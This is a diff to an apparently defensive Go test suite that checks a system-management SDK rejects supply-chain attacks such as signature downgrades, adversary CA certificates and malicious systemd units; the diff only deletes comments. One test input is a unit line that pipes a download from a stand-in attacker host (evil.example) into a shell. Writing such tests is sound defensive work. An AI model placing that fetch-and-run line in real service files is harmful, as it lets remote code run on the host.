@@ -25,9 +25,6 @@ import (
 	"github.com/manchtools/cadestro/sdk/sys/service"
 )
 
-// TestAdversarialSupplyChainTrustMachine covers attack classes that are hard to
-// see in package-local tests: trust downgrades, hostile host output reused as
-// privileged input, and failed multi-step mutations that leave a foothold behind.
 func TestAdversarialSupplyChainTrustMachine(t *testing.T) {
 	programs := []attackProgram{
 		repositoryTrustDowngradeProgram(),
@@ -50,14 +47,7 @@ func TestAdversarialSupplyChainTrustMachine(t *testing.T) {
 func repositoryTrustDowngradeProgram() attackProgram {
 	return attackProgram{
 		name: "repository trust downgrade",
-		// NOTE: apt `Trusted: yes` and dnf `gpgcheck=false` (signature
-		// verification disabled) are explicit, documented OPERATOR CHOICES, kept
-		// per the 2026-06 policy decision (same as WS8). They are allowed by
-		// design and pinned by repo's TestApt_Apply_TrustedNoKey /
-		// TestDnf_Apply_GPGCheckFalseIgnoresKey, so they are NOT adversary cases
-		// here. The downgrades that ARE refused — pacman SigLevel Never (no valid
-		// per-invocation operator semantics) and an unpinned destructive remote
-		// mirror — remain below.
+
 		steps: []programStep{
 			{
 				name:   "Pacman SigLevel Never is rejected before config write",
@@ -96,7 +86,7 @@ func trustAnchorAndUnitDropperProgram() attackProgram {
 					if err == nil {
 						err = m.Install(env.ctx, "corp-root", adversaryCert(t, true, x509.KeyUsageDigitalSignature))
 						if err != nil && !errors.Is(err, catrust.ErrInvalidCert) {
-							err = nil // reached filesystem/refresh instead of failing at certificate policy
+							err = nil
 						}
 					}
 					return observation{err: err, commands: r.Calls()}
@@ -111,7 +101,7 @@ func trustAnchorAndUnitDropperProgram() attackProgram {
 					if err == nil {
 						err = m.WriteUnit(env.ctx, "cadestro-dropper.service", "[Service]\nExecStart=/bin/sh -c 'curl https://evil.example/p | sh'\n")
 						if err != nil && !errors.Is(err, service.ErrUnsafeUnitContent) {
-							err = nil // a host/filesystem failure is not a content-policy rejection; keep only the policy sentinel (mirrors the CA-cert case above)
+							err = nil
 						}
 					}
 					return observation{err: err, commands: r.Calls()}
@@ -160,20 +150,15 @@ func partialSideEffectProgram() attackProgram {
 		name: "partial side-effect rollback",
 		steps: []programStep{
 			{
-				// Apply MUST run `connection modify` to set DNS (TestNM_ApplySuccess
-				// requires it), so noPrivilegedMutation is the wrong oracle here.
-				// The real guarantee is ROLLBACK: when reactivation (`connection up`)
-				// fails after the modify, the staged — possibly attacker-influenced —
-				// DNS must not persist in the saved profile. We assert that the final
-				// command clears the staged resolver (never leaves 10.0.0.53 staged).
+
 				name:   "NetworkManager reactivation failure rolls back the staged DNS mutation",
 				oracle: mustReject,
 				run: func(t *testing.T, env *attackEnv) observation {
 					r := exectest.New(sdkexec.Direct)
-					r.Push(sdkexec.Result{Stdout: "Corp WiFi\n"}, nil)                    // active connection lookup
-					r.Push(sdkexec.Result{}, nil)                                         // connection modify (set DNS) succeeds
-					r.Push(sdkexec.Result{ExitCode: 1, Stderr: "activation failed"}, nil) // connection up fails
-					r.Push(sdkexec.Result{}, nil)                                         // rollback: clear the staged DNS
+					r.Push(sdkexec.Result{Stdout: "Corp WiFi\n"}, nil)
+					r.Push(sdkexec.Result{}, nil)
+					r.Push(sdkexec.Result{ExitCode: 1, Stderr: "activation failed"}, nil)
+					r.Push(sdkexec.Result{}, nil)
 					m, err := dns.New(dns.NetworkManager, r)
 					if err == nil {
 						err = m.Apply(env.ctx, dns.Config{Interface: "wlan0", Nameservers: []string{"10.0.0.53"}})
